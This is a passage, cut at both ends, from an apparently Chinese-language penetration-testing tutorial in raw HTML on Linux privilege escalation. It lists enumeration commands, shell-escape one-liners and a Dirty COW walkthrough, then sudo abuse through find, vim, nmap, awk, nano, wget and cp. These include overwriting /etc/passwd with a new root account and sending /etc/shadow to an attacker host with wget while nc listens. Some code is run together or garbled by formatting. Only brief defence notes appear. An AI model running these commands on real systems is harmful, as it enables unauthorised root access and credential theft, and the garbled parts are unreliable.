/var/log/faillog<br><span class="hljs-built_in">cat</span> /var/log/httpd/access_log<br><span class="hljs-built_in">cat</span> /var/log/httpd/access.log<br><span class="hljs-built_in">cat</span> /var/log/httpd/error_log<br><span class="hljs-built_in">cat</span> /var/log/httpd/error.log<br><span class="hljs-built_in">cat</span> /var/log/lastlog<br><span class="hljs-built_in">cat</span> /var/log/lighttpd/access.log<br><span class="hljs-built_in">cat</span> /var/log/lighttpd/error.log<br><span class="hljs-built_in">cat</span> /var/log/lighttpd/lighttpd.access.log<br><span class="hljs-built_in">cat</span> /var/log/lighttpd/lighttpd.error.log<br><span class="hljs-built_in">cat</span> /var/log/messagescat /var/log/secure<br><span class="hljs-built_in">cat</span> /var/log/syslogcat /var/log/wtmp<br><span class="hljs-built_in">cat</span> /var/log/xferlog<br><span class="hljs-built_in">cat</span> /var/log/yum.log<br><span class="hljs-built_in">cat</span> /var/run/utmp<br><span class="hljs-built_in">cat</span> /var/webmin/miniserv.log<br><span class="hljs-built_in">cat</span> /var/www/logs/access_log<br><span class="hljs-built_in">cat</span> /var/www/logs/access.log<br><span class="hljs-built_in">ls</span> -alh /var/lib/dhcp3/<br><span class="hljs-built_in">ls</span> -alh /var/log/postgresql/<br><span class="hljs-built_in">ls</span> -alh /var/log/proftpd/<br><span class="hljs-built_in">ls</span> -alh /var/log/samba/<br>Note: auth.log, boot, btmp, daemon.log, debug, dmesg, kern.log, mail.info, mail.log, mail.warn, messages, syslog, udev, wtmp<br></code></pre></td></tr></table></figure><h5 id="尝试跳出命令限制"><a href="#尝试跳出命令限制" class="headerlink" title="尝试跳出命令限制"></a>尝试跳出命令限制</h5><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash">python -c <span class="hljs-string">&#x27;import pty;pty.spawn(&quot;/bin/bash&quot;)&#x27;</span><br><br><span class="hljs-built_in">echo</span> os.system(<span class="hljs-string">&#x27;/bin/bash&#x27;</span>)<br><br>/bin/sh -i<br></code></pre></td></tr></table></figure><p><strong>挂载的文件系统</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">mount <span class="hljs-built_in">df</span> -h<br></code></pre></td></tr></table></figure><p><strong>卸载的文件系统</strong> </p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cat</span> /etc/fstab<br></code></pre></td></tr></table></figure><p><strong>特殊文件权限</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs bash">find / -perm -1000 -<span class="hljs-built_in">type</span> d 2&gt;/dev/null   <span class="hljs-comment"># Sticky bit - Only the owner of the directory or the owner of a file can delete or rename here.</span><br><br>find / -perm -g=s -<span class="hljs-built_in">type</span> f 2&gt;/dev/null    <span class="hljs-comment"># SGID (chmod 2000) - run as the group, not the user who started it.</span><br><br>find / -perm -u=s -<span class="hljs-built_in">type</span> f 2&gt;/dev/null    <span class="hljs-comment"># SUID (chmod 4000) - run as the owner, not the user who started it.</span><br><br>find / -perm -g=s -o -perm -u=s -<span class="hljs-built_in">type</span> f 2&gt;/dev/null    <span class="hljs-comment"># SGID or SUIDfor i in `locate -r &quot;bin$&quot;`; do</span><br><br>find <span class="hljs-variable">$i</span> \( -perm -4000 -o -perm -2000 \) -<span class="hljs-built_in">type</span> f 2&gt;/dev/null; <span class="hljs-keyword">done</span>    <span class="hljs-comment"># Looks in &#x27;common&#x27; places: /bin, /sbin, /usr/bin, /usr/sbin, /usr/local/bin, /usr/local/sbin and any other *bin, for SGID or SUID (Quicker search)#</span><br><br>find starting at root (/), SGID or SUID, not Symbolic links, only 3 folders deep, list with more detail and hide any errors (e.g. permission denied)find / -perm -g=s -o -perm -4000 ! -<span class="hljs-built_in">type</span> l -maxdepth 3 -<span class="hljs-built_in">exec</span> <span class="hljs-built_in">ls</span> -ld &#123;&#125; \; 2&gt;/dev/null<br></code></pre></td></tr></table></figure><h5 id="可以在哪里写入和执行？一些“常见”位置"><a href="#可以在哪里写入和执行？一些“常见”位置" class="headerlink" title="可以在哪里写入和执行？一些“常见”位置:"></a>可以在哪里写入和执行？一些“常见”位置:</h5><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs bash">/ tmp<br>/ var / tmp<br>/ dev / shm<br>find / -writable -<span class="hljs-built_in">type</span> d 2&gt;/dev/null      <span class="hljs-comment"># world-writeable folders</span><br>find / -perm -222 -<span class="hljs-built_in">type</span> d 2&gt;/dev/null     <span class="hljs-comment"># world-writeable folders</span><br>find / -perm -o w -<span class="hljs-built_in">type</span> d 2&gt;/dev/null     <span class="hljs-comment"># world-writeable folders</span><br>find / -perm -o x -<span class="hljs-built_in">type</span> d 2&gt;/dev/null     <span class="hljs-comment"># world-executable folders</span><br>find / \( -perm -o w -perm -o x \) -<span class="hljs-built_in">type</span> d 2&gt;/dev/null   <span class="hljs-comment"># world-writeable &amp; executable folders</span><br></code></pre></td></tr></table></figure><p><strong>任何“问题”文件吗？Word可写的“没人”文件</strong></p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-built_in">find</span> / -xdev -type d \( -perm -0002 -a ! -perm -1000 \) -<span class="hljs-built_in">print</span>   # world-writeable filesfind /dir -xdev \( -nouser -o -nogroup \) -<span class="hljs-built_in">print</span>   # Noowner files<br></code></pre></td></tr></table></figure><h3 id="准备和查找漏洞利用代码"><a href="#准备和查找漏洞利用代码" class="headerlink" title="准备和查找漏洞利用代码"></a>准备和查找漏洞利用代码</h3><h5 id="安装-x2F-支持的开发工具-x2F-语言"><a href="#安装-x2F-支持的开发工具-x2F-语言" class="headerlink" title="安装&#x2F;支持的开发工具&#x2F;语言"></a>安装&#x2F;支持的开发工具&#x2F;语言</h5><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">find / -name perl*<br>find / -name python*<br>find / -name gcc*<br>find / -name cc<br></code></pre></td></tr></table></figure><p><strong>上传文件</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash">find / -name wget<br>find / -name nc*<br>find / -name netcat*<br>find / -name tftp*<br>find / -name ftp<br></code></pre></td></tr></table></figure><p><strong>系统补丁</strong></p><p>内核，操作系统，所有应用程序，其插件和Web服务</p><h2 id="0x03-Linux提权-自动信息收集"><a href="#0x03-Linux提权-自动信息收集" class="headerlink" title="0x03 Linux提权-自动信息收集"></a>0x03 Linux提权-自动信息收集</h2><h3 id="枚举脚本"><a href="#枚举脚本" class="headerlink" title="枚举脚本"></a>枚举脚本</h3><p>我主要使用了三个用于枚举机器的脚本。它们在脚本之间有些区别，但是它们输出的内容很多相同。因此，将它们全部测试一下，看看您最喜欢哪一个。</p><p><strong>LinEnum</strong></p><p><a href="https://github.com/rebootuser/LinEnum">https://github.com/rebootuser/LinEnum</a></p><p>以下是选项:</p><figure class="highlight diff"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs diff"><span class="hljs-deletion">-k Enter keyword</span><br><span class="hljs-deletion">-e Enter export location</span><br><span class="hljs-deletion">-t Include thorough (lengthy) tests</span><br><span class="hljs-deletion">-r Enter report name</span><br><span class="hljs-deletion">-h Displays this help text</span><br></code></pre></td></tr></table></figure><p><strong>Unix特权</strong></p><p><a href="http://pentestmonkey.net/tools/audit/unix-privesc-check">http://pentestmonkey.net/tools/audit/unix-privesc-check</a><br>运行脚本并将输出保存在文件中，然后使用grep发出警告。</p><p><strong>Linprivchecker.py</strong></p><p><a href="https://github.com/reider-roque/linpostexp/blob/master/linprivchecker.py">https://github.com/reider-roque/linpostexp/blob/master/linprivchecker.py</a></p><h2 id="0x04-Linux提权-内核漏洞提权"><a href="#0x04-Linux提权-内核漏洞提权" class="headerlink" title="0x04 Linux提权-内核漏洞提权"></a>0x04 Linux提权-内核漏洞提权</h2><p>通过利用Linux内核中的漏洞，有时我们可以提升特权。我们可以通过系统的体系结构和内核版本验证内核提权是否可行。</p><p>假设我们可以以非特权用户身份运行代码，这就是内核提权的工作流程。</p><p>1.诱使内核在内核模式下运行我们的Payload</p><p>2.处理内核数据，例如进程特权</p><p>3.以新特权启动shell，获得root shell</p><p><strong>考虑到要成功利用内核利用攻击，攻击者需要满足以下四个条件:</strong></p><p>1.易受攻击的内核</p><p>2.匹配的漏洞利用程序</p><p>3.将漏洞利用程序转移到目标上</p><p>4.在目标上执行漏洞利用程序</p><p>防御内核提权的最简单方法是及时打补丁和更新。在没有补丁的情况下，管理员可以极大地影响在目标上转移和执行漏洞利用的能力。考虑到这些因素，如果管理员可以阻止将利用程序引入和&#x2F;或执行到Linux文件系统上，则内核利用程序攻击将不再可行。因此，管理员应专注于限制或删除支持文件传输的程序，例如FTP，TFTP，SCP，wget和curl。当需要这些程序时，它们的使用应限于特定的用户，目录，应用程序（例如SCP）和特定的IP地址或域。</p><p><strong>内核信息收集</strong></p><p>一些基本命令收集一些Linux内核信息</p><table><thead><tr><th><strong>命令</strong></th><th><strong>结果</strong></th></tr></thead><tbody><tr><td>uname -a</td><td>打印所有可用的系统信息</td></tr><tr><td>uname -m</td><td>Linux内核体系结构（32或64位）</td></tr><tr><td>uname -r</td><td>内核发布</td></tr><tr><td>uname -n要么hostname</td><td>系统主机名</td></tr><tr><td>cat &#x2F;proc&#x2F;version</td><td>内核信息</td></tr><tr><td>cat &#x2F;etc&#x2F;*-release要么cat &#x2F;etc&#x2F;issue</td><td>发行信息</td></tr><tr><td>cat &#x2F;proc&#x2F;cpuinfo</td><td>CPU信息</td></tr><tr><td>df -a</td><td>文件系统信息</td></tr><tr><td>dpkg –list 2&gt;&#x2F;dev&#x2F;null| grep compiler |grep -v decompiler 2&gt;&#x2F;dev&#x2F;null &amp;&amp; yum list installed ‘gcc*’ 2&gt;&#x2F;dev&#x2F;null| grep gcc 2&gt;&#x2F;dev&#x2F;null</td><td>列出可用的编译器</td></tr></tbody></table><p><strong>对漏洞进行搜索</strong></p><blockquote><p>exploit-db.com kernel version python linprivchecker.py extended</p></blockquote><p><strong>脏牛（CVE-2016-5195）提权过程</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs bash">1.$ <span class="hljs-built_in">whoami</span><br>告诉我们当前用户是john（非root用户）<br>2.$ <span class="hljs-built_in">uname</span> -a <br>该内核版本受漏洞影响<br>&gt;从此处下载dirtycow漏洞– https://www.exploit-db.com/exploits/40839/<br>&gt;&gt;编译并执行。通过编辑/etc/passwd文件，它将<span class="hljs-string">&quot;root&quot;</span>用户替换为新用户<span class="hljs-string">&quot;rash&quot;</span>。<br>3.$ su rash –将当前登录用户更改为root用户的“ rash”。<br></code></pre></td></tr></table></figure><p><strong>其他内核提权</strong></p><p><a href="https://github.com/dirtycow/dirtycow.github.io/wiki/PoCs">https://github.com/dirtycow/dirtycow.github.io/wiki/PoCs</a></p><p>另外，Kali上有exploit-db的本地副本，同样可以进行查询</p><p>&#x3D;&#x3D;<strong>避免一开始就利用任何本地特权升级漏洞</strong>&#x3D;&#x3D;</p><p>使用内核漏洞进行提权可能会使计算机崩溃或使其处于不稳定状态。因此，&#x3D;&#x3D;内核漏洞利用应该是最后的手段&#x3D;&#x3D;。</p><h2 id="0x05-Linux提权-利用以root权限运行的服务"><a href="#0x05-Linux提权-利用以root权限运行的服务" class="headerlink" title="0x05 Linux提权-利用以root权限运行的服务"></a>0x05 Linux提权-利用以root权限运行的服务</h2><p>著名的<a href="https://en.wikipedia.org/wiki/EternalBlue">EternalBlue</a>和<a href="https://thehackernews.com/2017/05/samba-rce-exploit.html">SambaCry</a>漏洞利用了以root身份运行的smb服务。由于它的致命组合，它被广泛用于在全球范围内传播勒索软件。</p><p>这里的手法是，如果特定服务以root用户身份运行，并且我们可以使该服务执行命令，则可以root用户身份执行命令。</p><p>我们可以重点检查Web服务，邮件服务，数据库服务等是否以root用户身份运行。很多时候，运维人员都以root用户身份运行这些服务，而忽略了它可能引起的安全问题。可能有一些服务在本地运行，而没有公开暴露出来，但是也可以利用。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash">netstat -antup <span class="hljs-comment">#显示所有打开并正在监听的端口。我们可以检查在本地运行的服务是否可以被利用。</span><br><br>ps aux <span class="hljs-comment">#列出哪些进程正在运行</span><br><br>ps -aux | grep root <span class="hljs-comment">#列出以root身份运行的服务。</span><br></code></pre></td></tr></table></figure><p>在Metasploits的meterpreter中</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">ps <span class="hljs-comment">#检查哪些进程正在运行</span><br></code></pre></td></tr></table></figure><p><strong>MySQL UDF提权</strong></p><p>MySQL UDF动态库漏洞利用可让我们从mysql shell执行任意命令。如果mysql以root特权运行，则命令将以root身份执行。</p><p>ps -aux | grep root 列出以root身份运行的服务。</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2022/04/img/%E5%86%85%E7%BD%91%E6%8F%90%E6%9D%83-Linux.assets/c390e8882c274864b54a4b4edf3c9911-164658049401417.png" alt="在这里插入图片描述"></p><p>可以看到mysql服务以root用户组运行，那么MySQL Shell执行任意命令时的身份就是root。</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2022/04/img/%E5%86%85%E7%BD%91%E6%8F%90%E6%9D%83-Linux.assets/491b3a4805a149fdafa6105263e304c7.png" alt="在这里插入图片描述"></p><p>拥有root权限的程序的二进制漏洞利用远没有内核漏洞利用危险，因为即使服务崩溃，主机也不会崩溃，并且服务可能会自动重启。</p><p><strong>防御</strong></p><p>除非真正需要，否则切勿以root用户身份运行任何服务，尤其是Web，数据库和文件服务器。</p><h2 id="0x06-Linux提权-滥用sudo"><a href="#0x06-Linux提权-滥用sudo" class="headerlink" title="0x06 Linux提权-滥用sudo"></a>0x06 Linux提权-滥用sudo</h2><p>在渗透中，我们拿到的webshell和反弹回来的shell权限可能都不高，如果我们可以使用sudo命令访问某些程序，则我们可以使用sudo命令提权。</p><p>常见的用来sudo提权的二进制文件</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs shell">/usr/bin/find<br>/usr/bin/nano<br>/usr/bin/vim<br>/usr/bin/man<br>/usr/bin/awk<br>/usr/bin/less<br>/usr/bin/nmap ( –interactive and –script method)<br>/bin/more<br>/usr/bin/wget<br>/usr/sbin/apache2<br></code></pre></td></tr></table></figure><h3 id="sudo介绍"><a href="#sudo介绍" class="headerlink" title="sudo介绍"></a>sudo介绍</h3><p>sudo是<a href="https://baike.baidu.com/item/linux%E7%B3%BB%E7%BB%9F/1732935">linux系统</a>管理指令，是允许<a href="https://baike.baidu.com/item/%E7%B3%BB%E7%BB%9F%E7%AE%A1%E7%90%86%E5%91%98/1503845">系统管理员</a>让普通用户执行一些或者全部的root命令的一个工具，如halt，reboot，su等等。这样不仅减少了root用户的登录 和管理时间，同样也提高了安全性。sudo不是对shell的一个代替，它是面向每个命令的。</p><p>基础</p><p>它的特性主要有这样几点:</p><ul><li>sudo能够限制用户只在某台<a href="https://baike.baidu.com/item/%E4%B8%BB%E6%9C%BA">主机</a>上运行某些命令。</li><li>sudo提供了丰富的日志，详细地记录了每个用户干了什么。它能够将日志传到中心主机或者日志服务器。</li><li>sudo使用<a href="https://baike.baidu.com/item/%E6%97%B6%E9%97%B4%E6%88%B3">时间戳</a>文件来执行类似的“检票”系统。当用户调用sudo并且输入它的密码时，用户获得了一张存活期为5分钟的票（这个值可以在编译的时候改变）。</li><li>sudo的配置文件是sudoers文件，它允许系统管理员集中的管理用户的使用权限和使用的主机。它所存放的位置默认是在&#x2F;etc&#x2F;sudoers，属性必须为0440。</li></ul><p>在sudo于1980年前后被写出之前，一般用户管理系统的方式是利用<a href="https://baike.baidu.com/item/su">su</a>切换为超级用户。但是使用su的缺点之一在于必须要先告知超级用户的密码。</p><p>sudo使一般用户不需要知道超级用户的密码即可获得权限。首先超级用户将普通用户的名字、可以执行的特定命令、按照哪种用户或用户组的身份执行等信息，登记在特殊的文件中（通常是&#x2F;etc&#x2F;sudoers），即完成对该用户的授权（此时该用户称为“sudoer”）；在一般用户需要取得特殊权限时，其可在命令前加上“sudo”，此时sudo将会询问该用户自己的密码（以确认终端机前的是该用户本人），回答后系统即会将该命令的进程以超级用户的权限运行。之后的一段时间内（默认为5分钟，可在&#x2F;etc&#x2F;sudoers自定义），使用sudo不需要再次输入密码。</p><p>由于不需要超级用户的密码，部分Unix系统甚至利用sudo使一般用户取代超级用户作为管理帐号，例如<a href="https://baike.baidu.com/item/Ubuntu">Ubuntu</a>、[Mac OS X](<a href="https://baike.baidu.com/item/Mac">https://baike.baidu.com/item/Mac</a> OS X)等。</p><p><strong>参数说明</strong>:</p><ul><li>-V 显示版本编号</li><li>-h 会显示版本编号及指令的使用方式说明</li><li>-l 显示出自己（执行 sudo 的使用者）的权限</li><li>-v 因为 sudo 在第一次执行时或是在 N 分钟内没有执行（N 预设为五）会问密码，这个参数是重新做一次确认，如果超过 N 分钟，也会问密码</li><li>-k 将会强迫使用者在下一次执行 sudo 时问密码（不论有没有超过 N 分钟）</li><li>-b 将要执行的指令放在背景执行</li><li>-p prompt 可以更改问密码的提示语，其中 %u 会代换为使用者的帐号名称， %h 会显示主机名称</li><li>-u username&#x2F;#uid 不加此参数，代表要以 root 的身份执行指令，而加了此参数，可以以 username 的身份执行指令（#uid 为该 username 的使用者号码）</li><li>-s 执行环境变数中的 SHELL 所指定的 shell ，或是 &#x2F;etc&#x2F;passwd 里所指定的 shell</li><li>-H 将环境变数中的 HOME （家目录）指定为要变更身份的使用者家目录（如不加 -u 参数就是系统管理者 root ）</li><li>command 要以系统管理者身份（或以 -u 更改为其他人）执行的指令</li></ul><h3 id="sudoers文件介绍"><a href="#sudoers文件介绍" class="headerlink" title="sudoers文件介绍"></a>sudoers文件介绍</h3><h4 id="sudoers文件主要有三部分组成"><a href="#sudoers文件主要有三部分组成" class="headerlink" title="sudoers文件主要有三部分组成:"></a>sudoers文件主要有三部分组成:</h4><ul><li>sudoers的默认配置（default），主要设置sudo的一些缺省值</li><li>alias（别名），主要有Host_Alias|Runas_Alias|User_Alias|Cmnd_Alias。</li><li>安全策略（规则定义）——<strong>重点</strong>。</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs bash">root ALL=(ALL) ALL<br><span class="hljs-comment">#说明1:root用户可以从 ALL终端作为 ALL（任意）用户执行，并运行 ALL（任意）命令。</span><br><span class="hljs-comment">#第一部分是用户，第二部分是用户可以在其中使用sudo命令的终端，第三部分是他可以充当的用户，最后一部分是他在使用时可以运行的命令。sudo</span><br><br>touhid ALL= /sbin/poweroff<br><span class="hljs-comment">#说明2:以上命令，使用户可以从任何终端使用touhid的用户密码关闭命令电源。</span><br><br>touhid ALL = (root) NOPASSWD: /usr/bin/find<br><span class="hljs-comment">#说明3:上面的命令，使用户可以从任何终端运行，以root用户身份运行命令find 而无需密码。</span><br></code></pre></td></tr></table></figure><h3 id="对sudo账户的利用"><a href="#对sudo账户的利用" class="headerlink" title="对sudo账户的利用"></a>对sudo账户的利用</h3><p>要利用sudo用户，您需要找到您必须允许的命令。<br>sudo -l</p><p>上面的命令显示了允许当前用户使用的命令。</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2022/04/img/%E5%86%85%E7%BD%91%E6%8F%90%E6%9D%83-Linux.assets/67b98c2f3dc04bfba3e90b52a4ffd4d7.png" alt="在这里插入图片描述"></p><p>此处sudo -l，显示用户已允许以root用户身份执行所有此二进制文件而无需密码。</p><p>让我们一一查看所有二进制文件（仅在索引中提到）和将<strong>特权</strong>提升给<strong>root</strong>用户。</p><h4 id="find命令利用"><a href="#find命令利用" class="headerlink" title="find命令利用"></a>find命令利用</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">sudo find /etc/passwd -<span class="hljs-built_in">exec</span> /bin/sh \;<br></code></pre></td></tr></table></figure><p>或者</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">sudo find /bin -name nano -<span class="hljs-built_in">exec</span> /bin/sh \;<br></code></pre></td></tr></table></figure><h4 id="Vim命令利用"><a href="#Vim命令利用" class="headerlink" title="Vim命令利用"></a>Vim命令利用</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">sudo vim -c <span class="hljs-string">&#x27;!sh&#x27;</span><br></code></pre></td></tr></table></figure><h4 id="Nmap命令利用"><a href="#Nmap命令利用" class="headerlink" title="Nmap命令利用"></a>Nmap命令利用</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment">#老版本nmap</span><br>sudo nmap --interactive <span class="hljs-comment">#交互式</span><br>&gt;!sh<br><br><br><span class="hljs-comment">#新版本nmap，需要nmap以root运行</span><br><span class="hljs-built_in">cat</span> os.execute(<span class="hljs-string">&quot;/bin/sh&quot;</span>) &gt; nse_root.nse<br><span class="hljs-comment">#nse是nmap的插件扩展名</span><br>nmap --script=/home/jens/nse_root.nse<br></code></pre></td></tr></table></figure><h4 id="Man命令利用"><a href="#Man命令利用" class="headerlink" title="Man命令利用"></a>Man命令利用</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">sudo man man<br><span class="hljs-comment">#之后按!按下并按Enter</span><br></code></pre></td></tr></table></figure><h4 id="less-x2F-more命令利用"><a href="#less-x2F-more命令利用" class="headerlink" title="less&#x2F;more命令利用"></a>less&#x2F;more命令利用</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash">sudo less /etc/hosts<br><br>sudo more /etc/hosts<br><br>之后按!按下并按Enter<br></code></pre></td></tr></table></figure><h4 id="awk命令利用"><a href="#awk命令利用" class="headerlink" title="awk命令利用"></a>awk命令利用</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">sudo awk <span class="hljs-string">&#x27;BEGIN &#123;system(&quot;/bin/sh&quot;)&#125;&#x27;</span><br></code></pre></td></tr></table></figure><h4 id="nano命令利用"><a href="#nano命令利用" class="headerlink" title="nano命令利用"></a>nano命令利用</h4><p>nano是文本编辑器，在您需要切换用户之后，您可以修改passwd文件并将用户添加为root特权。在&#x2F;etc &#x2F;passwd中添加此行，以将用户添加为root特权。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash">touhid:$ 6 $ bxwJfzor<span class="hljs-variable">$MUhUWO0MUgdkWfPPEydqgZpm</span>.YtPMI / gaM4lVqhP21LFNWmSJ821kvJnIyoODYtBh.SF9aR7ciQBRCcw5bgjX0:0:0:root:/root:/bin<br><br>sudo nano /etc/passwd<br><br><span class="hljs-comment">#现在切换用户，密码是test</span><br>su touhid<br></code></pre></td></tr></table></figure><h4 id="wget命令利用"><a href="#wget命令利用" class="headerlink" title="wget命令利用"></a>wget命令利用</h4><p>这种方式要求Web服务器下载文件。流程如下</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">1.首先将目标机的/etc/passwd文件复制到攻击者计算机。<br>2.修改文件，并在上一步中保存的密码文件中添加用户到攻击者计算机。<br>3.仅附加此行=&gt;  touhid:$ 6 $ bxwJfzor $ MUhUWO0MUgdkWfPPEydqgZpm.YtPMI / gaM4lVqhP21LFNWmSJ821kvJnIyoODYtBh.SF9aR7ciQBRCcw5bgjX0 / 0:b:root/root:<br>4.将passwd文件托管到使用任何Web服务器的主机。<br></code></pre></td></tr></table></figure><p>在目标机器上执行</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">sudo wget http://192.168.56.1:8080/passwd -O /etc/passwd<br></code></pre></td></tr></table></figure><p>现在切换用户，密码是test</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">su touhid<br></code></pre></td></tr></table></figure><p>从服务器上转储文件，例如root的ssh密钥，shadow文件等的命令如下</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">sudo wget  --post-file = /etc/shadow 192.168.56.1:8080<br></code></pre></td></tr></table></figure><p>攻击机使用nc监听端口</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">nc –lvp 8080<br></code></pre></td></tr></table></figure><h4 id="apache命令利用"><a href="#apache命令利用" class="headerlink" title="apache命令利用"></a>apache命令利用</h4><p>无法通过这种方式获得写权限和Shell，但是使用它我们可以查看系统文件。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">sudo apache2 -f /etc/shadow<br></code></pre></td></tr></table></figure><p>输出</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">Syntax</span> error <span class="hljs-literal">on</span> line <span class="hljs-number">1</span> of /etc/shadow:Invalid command &#x27;root:$<span class="hljs-number">6</span>$bxwJfzor$MUhUWO0MUgdkWfPPEydqgZpm.YtPMI/gaM4lVqhP21LFNWmSJ821kvJnIyoODYtBh.SF9aR7ciQBRCcw5bgjX0:<span class="hljs-number">17298</span>:<span class="hljs-number">0</span>:<span class="hljs-number">99999</span>:<span class="hljs-number">7</span>:::&#x27;, perhaps misspelled or defined by a module not included in the server configuration<br></code></pre></td></tr></table></figure><p>我们可以现在提取root哈希并尝试破解。</p><h4 id="cp命令利用"><a href="#cp命令利用" class="headerlink" title="cp命令利用"></a>cp命令利用</h4><p>覆盖 &#x2F;etc&#x2F;shadow 或 &#x2F;etc&#x2F;passwd</p><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs elixir">[zabbix<span class="hljs-variable">@localhost</span> ~]<span class="hljs-variable">$ </span>cat /etc/passwd &gt;passwd[zabbix<span class="hljs-variable">@localhost</span> ~]<span class="hljs-variable">$ </span>openssl passwd <span class="hljs-number">-1</span> -salt hack hack123<span class="hljs-variable">$1</span><span class="hljs-variable">$hack</span><span class="hljs-variable">$WTn0dk2QjNeKfl</span>.<span class="hljs-title class_">DHOUue0</span>[zabbix<span class="hljs-variable">@localhost</span> ~]<span class="hljs-variable">$ </span>echo <span class="hljs-string">&#x27;hack:$1$hack$WTn0dk2QjNeKfl.DHOUue0:0:0::/root/:/bin/bash&#x27;</span> &gt;&gt; passwd[zabbix<span class="hljs-variable">@localhost</span> ~]<span class="hljs-variable">$ </span>cp passwd /etc/passwd[zabbix<span class="hljs-variable">@localhost</span> ~]<span class="hljs-variable">$ </span>su - <span class="hljs-symbol">hackPassword:</span>[root<span class="hljs-variable">@361way</span> ~]<span class="hljs-comment"># iduid=0(hack) gid=0(root) groups=0(root)[root@361way ~]# cat /etc/passwd|tail -1hack:$1$hack$WTn0dk2QjNeKfl.DHOUue0:0:0::/root/:/bin/bash</span><br></code></pre></td></tr></table></figure><h4 